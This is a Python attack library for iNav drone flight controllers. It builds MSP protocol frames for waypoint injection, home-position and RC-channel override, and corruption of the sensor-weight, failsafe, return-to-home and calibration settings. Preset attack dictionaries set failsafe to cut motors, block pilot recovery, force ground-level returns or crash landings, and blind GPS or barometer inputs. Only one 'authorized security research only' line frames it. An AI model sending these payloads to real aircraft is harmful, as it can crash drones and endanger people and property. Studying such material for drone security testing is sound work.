"""
iNav MSP Protocol Library — Navigation Attack Surface

Implements MSP v1/v2 framing and all navigation-critical commands for iNav:
- Waypoint injection (MSP_SET_WP, including home WP#0 and follow-me WP#255)
- Position estimator weight manipulation (MSP_SET_POSITION_ESTIMATION_CONFIG)
- Failsafe parameter corruption (MSP_SET_FAILSAFE_CONFIG)
- RTH configuration tampering (MSP_SET_RTH_AND_LAND_CONFIG)
- Navigation parameter manipulation (MSP_SET_NAV_POSHOLD, MSP_SET_NAV_CONFIG)
- Calibration data corruption (MSP_SET_CALIBRATION_DATA)
- RC channel override (MSP_SET_RAW_RC)
- Recon: read waypoints, nav status, FC info, GPS data

Usage:
    # Build a waypoint injection packet (MSPv2):
    from inav_msp import build_set_wp, MSPv2Frame
    wp_payload = build_set_wp(wp_no=0, action=WP_ACTION_WAYPOINT,
                              lat=40.7128, lon=-74.0060, alt_m=30)
    frame = MSPv2Frame.build(MSP_SET_WP, wp_payload)
    # frame.raw is ready to send over serial

    # Parse an MSP response:
    responses = MSPv2Frame.find_all(serial_data)

For authorized security research only.
"""

import struct
import math


# ============================================================
# MSP Command IDs — Navigation Critical
# ============================================================

# Read commands (recon)
MSP_API_VERSION = 1
MSP_FC_VARIANT = 2
MSP_FC_VERSION = 3
MSP_BOARD_INFO = 4
MSP_BUILD_INFO = 5
MSP_INAV_PID = 6
MSP_SET_INAV_PID = 7
MSP_NAME = 10
MSP_SET_NAME = 11
MSP_NAV_POSHOLD = 12
MSP_SET_NAV_POSHOLD = 13
MSP_CALIBRATION_DATA = 14
MSP_SET_CALIBRATION_DATA = 15
MSP_POSITION_ESTIMATION_CONFIG = 16
MSP_SET_POSITION_ESTIMATION_CONFIG = 17
MSP_WP_MISSION_LOAD = 18
MSP_WP_MISSION_SAVE = 19
MSP_WP_GETINFO = 20
MSP_RTH_AND_LAND_CONFIG = 21
MSP_SET_RTH_AND_LAND_CONFIG = 22
MSP_FW_CONFIG = 23
MSP_SET_FW_CONFIG = 24
MSP_MODE_RANGES = 34
MSP_SET_MODE_RANGE = 35
MSP_FEATURE = 36
MSP_SET_FEATURE = 37
MSP_BOARD_ALIGNMENT = 38
MSP_SET_BOARD_ALIGNMENT = 39
MSP_RX_CONFIG = 44
MSP_SET_RX_CONFIG = 45
MSP_FAILSAFE_CONFIG = 75
MSP_SET_FAILSAFE_CONFIG = 76
MSP_RAW_GPS = 106
MSP_COMP_GPS = 107
MSP_ATTITUDE = 108
MSP_ALTITUDE = 109
MSP_RC = 105
MSP_RAW_IMU = 102
MSP_STATUS = 101
MSP_WP = 118
MSP_NAV_STATUS = 121
MSP_NAV_CONFIG = 122
MSP_SET_RAW_RC = 200
MSP_SET_RAW_GPS = 201
MSP_SET_WP = 209
MSP_SET_HEAD = 211
MSP_SET_NAV_CONFIG = 215
MSP_REBOOT = 68
MSP_DATAFLASH_ERASE = 72
MSP_EEPROM_WRITE = 250

# Waypoint actions
WP_ACTION_WAYPOINT = 1
WP_ACTION_POSHOLD_UNLIM = 2
WP_ACTION_POSHOLD_TIME = 3
WP_ACTION_RTH = 4
WP_ACTION_SET_POI = 5
WP_ACTION_JUMP = 6
WP_ACTION_SET_HEAD = 7
WP_ACTION_LAND = 8

WP_ACTION_NAMES = {
    1: 'WAYPOINT', 2: 'POSHOLD_UNLIM', 3: 'POSHOLD_TIME',
    4: 'RTH', 5: 'SET_POI', 6: 'JUMP', 7: 'SET_HEAD', 8: 'LAND',
}

# Waypoint flags
WP_FLAG_NORMAL = 0x00
WP_FLAG_LAST = 0xA5
WP_FLAG_FLYBYHOME = 0x48

# Failsafe procedures
FAILSAFE_PROCEDURE_DROP = 0
FAILSAFE_PROCEDURE_SET_THR = 1
FAILSAFE_PROCEDURE_RTH = 2

# Feature mask bits (for MSP_SET_FEATURE)
FEATURE_GPS = (1 << 7)
FEATURE_TELEMETRY = (1 << 10)
FEATURE_CURRENT_METER = (1 << 11)
FEATURE_BLACKBOX = (1 << 19)
FEATURE_GPS_SWITCH = (1 << 28)

# Navigation modes (for mode range mapping)
MODE_ARM = 0
MODE_ANGLE = 1
MODE_HORIZON = 2
MODE_NAV_ALTHOLD = 3
MODE_HEADING_HOLD = 5
MODE_NAV_RTH = 10
MODE_NAV_POSHOLD = 11
MODE_NAV_WP = 28
MODE_GCS_NAV = 45
MODE_FAILSAFE = 27

MODE_NAMES = {
    0: 'ARM', 1: 'ANGLE', 2: 'HORIZON', 3: 'NAV_ALTHOLD',
    5: 'HEADING_HOLD', 10: 'NAV_RTH', 11: 'NAV_POSHOLD',
    27: 'FAILSAFE', 28: 'NAV_WP', 45: 'GCS_NAV',
}

MSP_CMD_NAMES = {
    1: 'MSP_API_VERSION', 2: 'MSP_FC_VARIANT', 3: 'MSP_FC_VERSION',
    4: 'MSP_BOARD_INFO', 10: 'MSP_NAME', 12: 'MSP_NAV_POSHOLD',
    13: 'MSP_SET_NAV_POSHOLD', 14: 'MSP_CALIBRATION_DATA',
    15: 'MSP_SET_CALIBRATION_DATA', 16: 'MSP_POSITION_ESTIMATION_CONFIG',
    17: 'MSP_SET_POSITION_ESTIMATION_CONFIG', 20: 'MSP_WP_GETINFO',
    21: 'MSP_RTH_AND_LAND_CONFIG', 22: 'MSP_SET_RTH_AND_LAND_CONFIG',
    23: 'MSP_FW_CONFIG', 24: 'MSP_SET_FW_CONFIG',
    34: 'MSP_MODE_RANGES', 35: 'MSP_SET_MODE_RANGE',
    36: 'MSP_FEATURE', 37: 'MSP_SET_FEATURE',
    75: 'MSP_FAILSAFE_CONFIG', 76: 'MSP_SET_FAILSAFE_CONFIG',
    101: 'MSP_STATUS', 102: 'MSP_RAW_IMU', 105: 'MSP_RC',
    106: 'MSP_RAW_GPS', 107: 'MSP_COMP_GPS', 108: 'MSP_ATTITUDE',
    109: 'MSP_ALTITUDE', 118: 'MSP_WP', 121: 'MSP_NAV_STATUS',
    122: 'MSP_NAV_CONFIG', 200: 'MSP_SET_RAW_RC',
    209: 'MSP_SET_WP', 211: 'MSP_SET_HEAD', 215: 'MSP_SET_NAV_CONFIG',
    250: 'MSP_EEPROM_WRITE', 68: 'MSP_REBOOT',
}


# ============================================================
# CRC Calculations
# ============================================================

def crc8_dvb_s2(data, crc=0):
    """CRC8/DVB-S2 used by MSPv2."""
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def mspv1_checksum(data):
    """XOR checksum used by MSPv1."""
    cs = 0
    for b in data:
        cs ^= b
    return cs


# ============================================================
# MSPv1 Frame
# ============================================================

class MSPv1Frame:
    """MSP v1 frame: $M< or $M> or $M!"""

    HEADER = b'$M'

    def __init__(self, direction, cmd, payload=b'', error=False):
        self.direction = direction  # '<' (to FC) or '>' (from FC)
        self.cmd = cmd
        self.payload = bytes(payload)
        self.error = error
        self.raw = self._encode()

    def _encode(self):
        size = len(self.payload)
        if size > 255:
            raise ValueError(f"MSPv1 payload too large: {size} bytes (max 255)")
        dir_byte = b'!' if self.error else self.direction.encode()
        cs_data = bytes([size, self.cmd & 0xFF]) + self.payload
        cs = mspv1_checksum(cs_data)
        return self.HEADER + dir_byte + bytes([size, self.cmd & 0xFF]) + self.payload + bytes([cs])

    @classmethod
    def build(cls, cmd, payload=b''):
        """Build request frame (to FC)."""
        return cls('<', cmd, payload)

    @classmethod
    def parse(cls, data):
        """Parse MSPv1 frame from bytes. Returns (frame, remaining_bytes) or (None, data)."""
        if len(data) < 6:
            return None, data
        if data[0:2] != b'$M':
            return None, data[1:]
        direction = chr(data[2])
        error = direction == '!'
        size = data[3]
        cmd = data[4]
        if len(data) < 6 + size:
            return None, data
        payload = data[5:5 + size]
        cs_received = data[5 + size]
        cs_data = bytes([size, cmd]) + payload
        cs_calculated = mspv1_checksum(cs_data)
        if cs_received != cs_calculated:
            return None, data[1:]
        frame = cls(direction if not error else '>', cmd, payload, error)
        frame.raw = data[:6 + size]
        return frame, data[6 + size:]

    @classmethod
    def find_all(cls, data):
        """Find all MSPv1 frames in a byte stream."""
        frames = []
        remaining = bytes(data)
        while len(remaining) >= 6:
            idx = remaining.find(b'$M')
            if idx < 0:
                break
            remaining = remaining[idx:]
            frame, remaining = cls.parse(remaining)
            if frame:
                frames.append(frame)
        return frames

    def describe(self):
        name = MSP_CMD_NAMES.get(self.cmd, f'UNKNOWN({self.cmd})')
        return (f"MSPv1 {self.direction} {name} (cmd={self.cmd}, "
                f"len={len(self.payload)}, error={self.error})")


# ============================================================
# MSPv2 Frame
# ============================================================

class MSPv2Frame:
    """MSP v2 frame: $X< or $X> or $X!"""

    HEADER = b'$X'

    def __init__(self, direction, cmd, payload=b'', flag=0, error=False):
        self.direction = direction
        self.cmd = cmd
        self.payload = bytes(payload)
        self.flag = flag
        self.error = error
        self.raw = self._encode()

    def _encode(self):
        size = len(self.payload)
        dir_byte = b'!' if self.error else self.direction.encode()
        header_data = struct.pack('<BHH', self.flag, self.cmd, size)
        crc_data = header_data + self.payload
        crc = crc8_dvb_s2(crc_data)
        return self.HEADER + dir_byte + header_data + self.payload + bytes([crc])

    @classmethod
    def build(cls, cmd, payload=b'', flag=0):
        """Build request frame (to FC)."""
        return cls('<', cmd, payload, flag)

    @classmethod
    def build_no_reply(cls, cmd, payload=b''):
        """Build request with no-reply flag (reduces latency for SET_RAW_RC)."""
        return cls('<', cmd, payload, flag=1)

    @classmethod
    def parse(cls, data):
        """Parse MSPv2 frame. Returns (frame, remaining_bytes) or (None, data)."""
        if len(data) < 9:
            return None, data
        if data[0:2] != b'$X':
            return None, data[1:]
        direction = chr(data[2])
        error = direction == '!'
        flag, cmd, size = struct.unpack_from('<BHH', data, 3)
        total_len = 8 + size + 1
        if len(data) < total_len:
            return None, data
        payload = data[8:8 + size]
        crc_received = data[8 + size]
        crc_data = data[3:8 + size]
        crc_calculated = crc8_dvb_s2(crc_data)
        if crc_received != crc_calculated:
            return None, data[1:]
        frame = cls(direction if not error else '>', cmd, payload, flag, error)
        frame.raw = data[:total_len]
        return frame, data[total_len:]

    @classmethod
    def find_all(cls, data):
        """Find all MSPv2 frames in a byte stream."""
        frames = []
        remaining = bytes(data)
        while len(remaining) >= 9:
            idx = remaining.find(b'$X')
            if idx < 0:
                break
            remaining = remaining[idx:]
            frame, remaining = cls.parse(remaining)
            if frame:
                frames.append(frame)
        return frames

    def describe(self):
        name = MSP_CMD_NAMES.get(self.cmd, f'UNKNOWN({self.cmd})')
        return (f"MSPv2 {self.direction} {name} (cmd={self.cmd}, "
                f"len={len(self.payload)}, flag={self.flag}, error={self.error})")


# ============================================================
# Waypoint Builders
# ============================================================

def build_set_wp(wp_no, action, lat, lon, alt_m=0, p1=0, p2=0, p3=0,
                 flag=WP_FLAG_NORMAL):
    """Build MSP_SET_WP payload (21 bytes).

    Args:
        wp_no: 0=home, 1-60=mission, 255=follow-me
        action: WP_ACTION_* constant
        lat: Latitude in degrees (float)
        lon: Longitude in degrees (float)
        alt_m: Altitude in meters (converted to cm internally)
        p1, p2, p3: Action-dependent parameters
        flag: 0x00=normal, 0xA5=last WP, 0x48=FlyByHome
    """
    lat_raw = int(lat * 1e7)
    lon_raw = int(lon * 1e7)
    alt_cm = int(alt_m * 100)
    return struct.pack('<BBiiihhhB',
                       wp_no, action,
                       lat_raw, lon_raw, alt_cm,
                       p1, p2, p3, flag)


def parse_wp(payload):
    """Parse MSP_WP response payload (21 bytes)."""
    if len(payload) < 21:
        return None
    wp_no, action, lat_raw, lon_raw, alt_cm, p1, p2, p3, flag = \
        struct.unpack_from('<BBiiihhhB', payload)
    return {
        'wp_no': wp_no,
        'action': action,
        'action_name': WP_ACTION_NAMES.get(action, f'UNKNOWN({action})'),
        'lat': lat_raw / 1e7,
        'lon': lon_raw / 1e7,
        'alt_m': alt_cm / 100.0,
        'p1': p1, 'p2': p2, 'p3': p3,
        'flag': flag,
        'is_last': flag == WP_FLAG_LAST,
    }


def build_mission(waypoints):
    """Build a complete mission as a list of MSP_SET_WP frames.

    Args:
        waypoints: List of dicts with keys: lat, lon, alt_m, action (optional),
                   p1 (optional), p2 (optional), p3 (optional)
    Returns:
        List of MSPv2Frame objects ready to send
    """
    frames = []
    for i, wp in enumerate(waypoints):
        is_last = (i == len(waypoints) - 1)
        flag = WP_FLAG_LAST if is_last else WP_FLAG_NORMAL
        payload = build_set_wp(
            wp_no=i + 1,
            action=wp.get('action', WP_ACTION_WAYPOINT),
            lat=wp['lat'], lon=wp['lon'],
            alt_m=wp.get('alt_m', 30),
            p1=wp.get('p1', 0), p2=wp.get('p2', 0), p3=wp.get('p3', 0),
            flag=flag,
        )
        frames.append(MSPv2Frame.build(MSP_SET_WP, payload))
    return frames


def build_home_override(lat, lon, alt_m=0):
    """Build MSP_SET_WP to override home position (WP#0).
    Requires: armed + GPS fix + GCS NAV mode active.
    """
    return MSPv2Frame.build(MSP_SET_WP, build_set_wp(
        wp_no=0, action=WP_ACTION_WAYPOINT,
        lat=lat, lon=lon, alt_m=alt_m))


def build_followme_update(lat, lon, alt_m=30, heading=0):
    """Build MSP_SET_WP for follow-me target (WP#255).
    Requires: armed + GPS fix + POSHOLD + GCS NAV mode active.
    Must be sent at >= 5Hz to maintain control.
    """
    return MSPv2Frame.build(MSP_SET_WP, build_set_wp(
        wp_no=255, action=WP_ACTION_WAYPOINT,
        lat=lat, lon=lon, alt_m=alt_m,
        p1=heading))


# ============================================================
# Position Estimator Manipulation
# ============================================================

def build_set_position_estimation_config(w_z_baro_p=None, w_z_baro_v=None,
                                          w_z_gps_p=None, w_xy_gps_p=None,
                                          w_xy_gps_v=None, min_sats=None,
                                          use_gps_vel=None):
    """Build MSP_SET_POSITION_ESTIMATION_CONFIG payload (12 bytes).

    Weights are float values (0.0-10.0), converted to uint16 × 100 internally.
    Set weights to 0 to disable a sensor source, or maximize to fully trust it.

    Note: the exact field order may vary by iNav version. This follows the
    documented order from the MSP Messages Reference.
    """
    def weight_to_raw(w, default=100):
        if w is None:
            return default
        return max(0, min(1000, int(w * 100)))

    payload = struct.pack('<HHHHHBB',
                          weight_to_raw(w_z_baro_p, 350),   # default ~3.5
                          weight_to_raw(w_z_baro_v, 60),    # default ~0.6
                          weight_to_raw(w_z_gps_p, 0),      # default 0 (experimental)
                          weight_to_raw(w_xy_gps_p, 110),   # default ~1.1
                          weight_to_raw(w_xy_gps_v, 200),   # default ~2.0
                          min_sats if min_sats is not None else 6,
                          use_gps_vel if use_gps_vel is not None else 0)
    return MSPv2Frame.build(MSP_SET_POSITION_ESTIMATION_CONFIG, payload)


# Pre-built position estimator attack payloads
POS_EST_ATTACKS = {
    'gps_blind': {
        'description': 'Zero GPS weights — estimator ignores GPS, drifts on IMU',
        'params': {'w_xy_gps_p': 0, 'w_xy_gps_v': 0, 'w_z_gps_p': 0},
    },
    'gps_maximized': {
        'description': 'Maximize GPS weights — GPS spoofing immediately effective',
        'params': {'w_xy_gps_p': 10.0, 'w_xy_gps_v': 10.0, 'w_z_gps_p': 10.0},
    },
    'baro_blind': {
        'description': 'Zero barometer weights — altitude from GPS only (spoofable)',
        'params': {'w_z_baro_p': 0, 'w_z_baro_v': 0},
    },
    'all_blind': {
        'description': 'Zero all external sensor weights — pure IMU drift',
        'params': {'w_z_baro_p': 0, 'w_z_baro_v': 0,
                   'w_xy_gps_p': 0, 'w_xy_gps_v': 0, 'w_z_gps_p': 0},
    },
    'sat_starve': {
        'description': 'Require 10 sats minimum — GPS rejected in most conditions',
        'params': {'min_sats': 10},
    },
}


# ============================================================
# Failsafe Parameter Corruption
# ============================================================

def build_set_failsafe_config(delay_ds=None, off_delay_ds=None, throttle=None,
                               procedure=None, recovery_delay_ds=None,
                               fw_roll_angle=None, fw_pitch_angle=None,
                               fw_yaw_rate=None, stick_threshold=None,
                               min_distance=None, min_distance_procedure=None):
    """Build MSP_SET_FAILSAFE_CONFIG payload (20 bytes).

    All time values in deciseconds (0.1s units).
    """
    payload = struct.pack('<BBHBBBBHHHB',
                          delay_ds if delay_ds is not None else 15,
                          off_delay_ds if off_delay_ds is not None else 200,
                          throttle if throttle is not None else 1000,
                          procedure if procedure is not None else FAILSAFE_PROCEDURE_RTH,
                          recovery_delay_ds if recovery_delay_ds is not None else 5,
                          fw_roll_angle if fw_roll_angle is not None else 0,
                          fw_pitch_angle if fw_pitch_angle is not None else 0,
                          fw_yaw_rate if fw_yaw_rate is not None else 0,
                          stick_threshold if stick_threshold is not None else 30,
                          min_distance if min_distance is not None else 0,
                          min_distance_procedure if min_distance_procedure is not None else 0)
    return MSPv2Frame.build(MSP_SET_FAILSAFE_CONFIG, payload)


# Pre-built failsafe attack payloads
FAILSAFE_ATTACKS = {
    'force_drop': {
        'description': 'Change failsafe to DROP — motors off on signal loss',
        'params': {'procedure': FAILSAFE_PROCEDURE_DROP, 'throttle': 1000},
    },
    'instant_disarm': {
        'description': 'Instant disarm on failsafe — zero off_delay',
        'params': {'off_delay_ds': 0, 'procedure': FAILSAFE_PROCEDURE_DROP},
    },
    'delayed_response': {
        'description': 'Max delay before failsafe — 25.5s uncontrolled flight',
        'params': {'delay_ds': 255},
    },
    'no_recovery': {
        'description': 'Stick threshold impossible — cannot regain manual control',
        'params': {'stick_threshold': 1000},
    },
    'distance_block': {
        'description': 'Min distance very high — close RTH becomes DROP',
        'params': {'min_distance': 65535, 'min_distance_procedure': FAILSAFE_PROCEDURE_DROP},
    },
}


# ============================================================
# RTH Configuration Tampering
# ============================================================

def build_set_rth_and_land_config(min_rth_distance=None, rth_climb_first=None,
                                   rth_climb_ignore_emerg=None,
                                   rth_tail_first=None, rth_allow_landing=None,
                                   rth_alt_control_mode=None,
                                   rth_abort_threshold=None,
                                   rth_altitude=None,
                                   land_min_alt=None, land_max_alt=None,
                                   land_slowdown_min_alt=None,
                                   land_slowdown_max_alt=None,
                                   emerg_descent_rate=None):
    """Build MSP_SET_RTH_AND_LAND_CONFIG payload (21 bytes)."""
    payload = struct.pack('<HBBBBBBHHHHHH',
                          min_rth_distance if min_rth_distance is not None else 500,
                          rth_climb_first if rth_climb_first is not None else 1,
                          rth_climb_ignore_emerg if rth_climb_ignore_emerg is not None else 0,
                          rth_tail_first if rth_tail_first is not None else 0,
                          rth_allow_landing if rth_allow_landing is not None else 1,
                          rth_alt_control_mode if rth_alt_control_mode is not None else 0,
                          rth_abort_threshold if rth_abort_threshold is not None else 50,
                          rth_altitude if rth_altitude is not None else 1000,
                          land_min_alt if land_min_alt is not None else 500,
                          land_max_alt if land_max_alt is not None else 2000,
                          land_slowdown_min_alt if land_slowdown_min_alt is not None else 250,
                          land_slowdown_max_alt if land_slowdown_max_alt is not None else 500,
                          emerg_descent_rate if emerg_descent_rate is not None else 500)
    return MSPv2Frame.build(MSP_SET_RTH_AND_LAND_CONFIG, payload)


RTH_ATTACKS = {
    'ground_level_rth': {
        'description': 'RTH at ground level — obstacle collisions',
        'params': {'rth_altitude': 0, 'rth_climb_first': 0},
    },
    'extreme_altitude': {
        'description': 'RTH at 500m — dangerous climb, possible airspace violation',
        'params': {'rth_altitude': 50000},
    },
    'no_landing': {
        'description': 'Disable landing — drone hovers until battery dies',
        'params': {'rth_allow_landing': 0},
    },
    'crash_landing': {
        'description': 'Max emergency descent rate — hard impact',
        'params': {'emerg_descent_rate': 5000},
    },
    'abort_immediately': {
        'description': 'Zero abort threshold — RTH cancels on any anomaly',
        'params': {'rth_abort_threshold': 0},
    },
}


# ============================================================
# Navigation Position Hold Manipulation
# ============================================================

def build_set_nav_poshold(user_control_mode=None, max_auto_speed=None,
                           max_auto_climb_rate=None, max_manual_speed=None,
                           max_manual_climb_rate=None, mc_max_bank_angle=None,
                           althold_throttle_type=None, mc_hover_throttle=None):
    """Build MSP_SET_NAV_POSHOLD payload (13 bytes)."""
    payload = struct.pack('<BHHHHBBH',
                          user_control_mode if user_control_mode is not None else 0,
                          max_auto_speed if max_auto_speed is not None else 300,
                          max_auto_climb_rate if max_auto_climb_rate is not None else 500,
                          max_manual_speed if max_manual_speed is not None else 500,
                          max_manual_climb_rate if max_manual_climb_rate is not None else 200,
                          mc_max_bank_angle if mc_max_bank_angle is not None else 30,
                          althold_throttle_type if althold_throttle_type is not None else 0,
                          mc_hover_throttle if mc_hover_throttle is not None else 1500)
    return MSPv2Frame.build(MSP_SET_NAV_POSHOLD, payload)


# ============================================================
# Calibration Data Corruption
# ============================================================

def build_set_calibration_data(accel_zero_x=0, accel_zero_y=0, accel_zero_z=0,
                                accel_gain_x=4096, accel_gain_y=4096, accel_gain_z=4096,
                                mag_zero_x=0, mag_zero_y=0, mag_zero_z=0,
                                opflow_scale=0):
    """Build MSP_SET_CALIBRATION_DATA payload (26 bytes).

    Default accel gain of 4096 = 1g. Corrupting these values causes
    systematic navigation errors.
    """
    payload = struct.pack('<hhhhhhhhhhH',
                          accel_zero_x, accel_zero_y, accel_zero_z,
                          accel_gain_x, accel_gain_y, accel_gain_z,
                          mag_zero_x, mag_zero_y, mag_zero_z,
                          opflow_scale)
    return MSPv2Frame.build(MSP_SET_CALIBRATION_DATA, payload)


CALIBRATION_ATTACKS = {
    'tilt_drift': {
        'description': 'Offset accel zeros — drone thinks level is tilted, drifts',
        'params': {'accel_zero_x': 500, 'accel_zero_y': 500},
    },
    'heading_error': {
        'description': 'Offset magnetometer — heading reads wrong, flies wrong direction',
        'params': {'mag_zero_x': 2000, 'mag_zero_y': -2000},
    },
    'gain_corrupt': {
        'description': 'Halve accel gain — velocity/position integration errors',
        'params': {'accel_gain_x': 2048, 'accel_gain_y': 2048, 'accel_gain_z': 2048},
    },
}


# ============================================================
# RC Channel Override
# ============================================================

def build_set_raw_rc(channels):
    """Build MSP_SET_RAW_RC payload.

    Args:
        channels: List of up to 18 channel values (1000-2000 µs).
                  Must send at >= 5Hz to avoid failsafe.
    """
    payload = struct.pack(f'<{len(channels)}H', *channels)
    return MSPv2Frame.build(MSP_SET_RAW_RC, payload)


def build_set_raw_rc_no_reply(channels):
    """Same as build_set_raw_rc but with no-reply flag for lower latency."""
    payload = struct.pack(f'<{len(channels)}H', *channels)
    return MSPv2Frame.build_no_reply(MSP_SET_RAW_RC, payload)


# ============================================================
# Recon Commands (read-only)
# ============================================================

def build_read_wp(wp_no):
    """Build MSP_WP request to read a waypoint."""
    return MSPv2Frame.build(MSP_WP, bytes([wp_no]))

def build_read_nav_status():
    """Build MSP_NAV_STATUS request."""
    return MSPv2Frame.build(MSP_NAV_STATUS)

def build_read_raw_gps():
    """Build MSP_RAW_GPS request."""
    return MSPv2Frame.build(MSP_RAW_GPS)

def build_read_attitude():
    """Build MSP_ATTITUDE request."""
    return MSPv2Frame.build(MSP_ATTITUDE)

def build_read_altitude():
    """Build MSP_ALTITUDE request."""
    return MSPv2Frame.build(MSP_ALTITUDE)

def build_read_rc():
    """Build MSP_RC request."""
    return MSPv2Frame.build(MSP_RC)

def build_read_status():
    """Build MSP_STATUS request."""
    return MSPv2Frame.build(MSP_STATUS)

def build_read_fc_variant():
    """Build MSP_FC_VARIANT request (identifies iNav)."""
    return MSPv2Frame.build(MSP_FC_VARIANT)

def build_read_fc_version():
    """Build MSP_FC_VERSION request."""
    return MSPv2Frame.build(MSP_FC_VERSION)

def build_read_wp_info():
    """Build MSP_WP_GETINFO request."""
    return MSPv2Frame.build(MSP_WP_GETINFO)

def build_read_failsafe_config():
    """Build MSP_FAILSAFE_CONFIG request."""
    return MSPv2Frame.build(MSP_FAILSAFE_CONFIG)

def build_read_rth_config():
    """Build MSP_RTH_AND_LAND_CONFIG request."""
    return MSPv2Frame.build(MSP_RTH_AND_LAND_CONFIG)

def build_read_position_estimation_config():
    """Build MSP_POSITION_ESTIMATION_CONFIG request."""
    return MSPv2Frame.build(MSP_POSITION_ESTIMATION_CONFIG)

def build_eeprom_write():
    """Build MSP_EEPROM_WRITE — save current settings to flash."""
    return MSPv2Frame.build(MSP_EEPROM_WRITE)


# ============================================================
# Response Parsers
# ============================================================

def parse_nav_status(payload):
    """Parse MSP_NAV_STATUS response."""
    if len(payload) < 7:
        return None
    gps_mode, nav_state, action, wp_number, nav_error = \
        struct.unpack_from('<BBBBB', payload)
    target_bearing = struct.unpack_from('<h', payload, 5)[0] if len(payload) >= 7 else 0
    return {
        'gps_mode': gps_mode,
        'nav_state': nav_state,
        'action': action,
        'wp_number': wp_number,
        'nav_error': nav_error,
        'target_bearing': target_bearing,
    }


def parse_raw_gps(payload):
    """Parse MSP_RAW_GPS response."""
    if len(payload) < 18:
        return None
    fix_type, num_sat = struct.unpack_from('<BB', payload)
    lat, lon = struct.unpack_from('<ii', payload, 2)
    alt, speed, ground_course, hdop = struct.unpack_from('<hHHH', payload, 10)
    return {
        'fix_type': fix_type,
        'num_sat': num_sat,
        'lat': lat / 1e7,
        'lon': lon / 1e7,
        'alt_m': alt,
        'speed_cms': speed,
        'ground_course_decdeg': ground_course / 10.0,
        'hdop': hdop / 100.0,
    }


def parse_attitude(payload):
    """Parse MSP_ATTITUDE response."""
    if len(payload) < 6:
        return None
    roll, pitch, yaw = struct.unpack_from('<hhh', payload)
    return {
        'roll_deg': roll / 10.0,
        'pitch_deg': pitch / 10.0,
        'yaw_deg': yaw,
    }


def parse_altitude(payload):
    """Parse MSP_ALTITUDE response."""
    if len(payload) < 6:
        return None
    alt_cm, vario = struct.unpack_from('<ih', payload)
    return {
        'alt_cm': alt_cm,
        'alt_m': alt_cm / 100.0,
        'vario_cms': vario,
    }


def parse_fc_variant(payload):
    """Parse MSP_FC_VARIANT response."""
    return payload.decode('ascii', errors='replace').strip('\x00')


def parse_fc_version(payload):
    """Parse MSP_FC_VERSION response."""
    if len(payload) < 3:
        return None
    major, minor, patch = struct.unpack_from('<BBB', payload)
    return f'{major}.{minor}.{patch}'


def parse_wp_info(payload):
    """Parse MSP_WP_GETINFO response."""
    if len(payload) < 4:
        return None
    reserved, max_wp, valid, wp_count = struct.unpack_from('<BBBB', payload)
    return {
        'max_waypoints': max_wp,
        'mission_valid': bool(valid),
        'waypoint_count': wp_count,
    }


def parse_position_estimation_config(payload):
    """Parse MSP_POSITION_ESTIMATION_CONFIG response."""
    if len(payload) < 12:
        return None
    w1, w2, w3, w4, w5 = struct.unpack_from('<HHHHH', payload)
    min_sats, use_gps_vel = struct.unpack_from('<BB', payload, 10)
    return {
        'w_z_baro_p': w1 / 100.0,
        'w_z_baro_v': w2 / 100.0,
        'w_z_gps_p': w3 / 100.0,
        'w_xy_gps_p': w4 / 100.0,
        'w_xy_gps_v': w5 / 100.0,
        'min_sats': min_sats,
        'use_gps_velocity': bool(use_gps_vel),
    }


# ============================================================
# Utility Functions
# ============================================================

def haversine_distance(lat1, lon1, lat2, lon2):
    """Calculate distance between two GPS coordinates in meters."""
    R = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlam = math.radians(lon2 - lon1)
    a = math.sin(dphi / 2) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


def bearing(lat1, lon1, lat2, lon2):
    """Calculate bearing from point 1 to point 2 in degrees."""
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dlam = math.radians(lon2 - lon1)
    x = math.sin(dlam) * math.cos(phi2)
    y = math.cos(phi1) * math.sin(phi2) - math.sin(phi1) * math.cos(phi2) * math.cos(dlam)
    return (math.degrees(math.atan2(x, y)) + 360) % 360


def generate_trajectory(start_lat, start_lon, end_lat, end_lon,
                        num_points=10, alt_m=30):
    """Generate a linear trajectory of waypoints between two points.

    Returns list of waypoint dicts suitable for build_mission().
    """
    waypoints = []
    for i in range(num_points):
        t = i / max(1, num_points - 1)
        lat = start_lat + t * (end_lat - start_lat)
        lon = start_lon + t * (end_lon - start_lon)
        waypoints.append({'lat': lat, 'lon': lon, 'alt_m': alt_m})
    return waypoints


def generate_orbit(center_lat, center_lon, radius_m=50, num_points=12,
                   alt_m=30):
    """Generate a circular orbit of waypoints around a center point.

    Returns list of waypoint dicts suitable for build_mission().
    """
    waypoints = []
    for i in range(num_points):
        angle = 2 * math.pi * i / num_points
        dlat = (radius_m * math.cos(angle)) / 111320
        dlon = (radius_m * math.sin(angle)) / (111320 * math.cos(math.radians(center_lat)))
        waypoints.append({
            'lat': center_lat + dlat,
            'lon': center_lon + dlon,
            'alt_m': alt_m,
        })
    return waypoints


# ============================================================
# Analysis & Demo
# ============================================================

def analyze_msp_stream(data):
    """Find and analyze all MSP frames (v1 and v2) in a byte stream."""
    v1_frames = MSPv1Frame.find_all(data)
    v2_frames = MSPv2Frame.find_all(data)

    print(f"Found {len(v1_frames)} MSPv1 frames, {len(v2_frames)} MSPv2 frames")

    all_frames = []
    for f in v1_frames:
        all_frames.append(('v1', f))
    for f in v2_frames:
        all_frames.append(('v2', f))

    nav_cmds = []
    for version, frame in all_frames:
        print(f"  [{version}] {frame.describe()}")
        if frame.cmd in (MSP_SET_WP, MSP_WP):
            wp = parse_wp(frame.payload)
            if wp:
                print(f"        WP#{wp['wp_no']}: {wp['action_name']} "
                      f"({wp['lat']:.7f}, {wp['lon']:.7f}) alt={wp['alt_m']}m")
                nav_cmds.append(('waypoint', wp))
        elif frame.cmd == MSP_NAV_STATUS:
            status = parse_nav_status(frame.payload)
            if status:
                print(f"        Nav: state={status['nav_state']} "
                      f"wp={status['wp_number']} error={status['nav_error']}")
                nav_cmds.append(('nav_status', status))
        elif frame.cmd == MSP_RAW_GPS:
            gps = parse_raw_gps(frame.payload)
            if gps:
                print(f"        GPS: fix={gps['fix_type']} sats={gps['num_sat']} "
                      f"({gps['lat']:.7f}, {gps['lon']:.7f})")
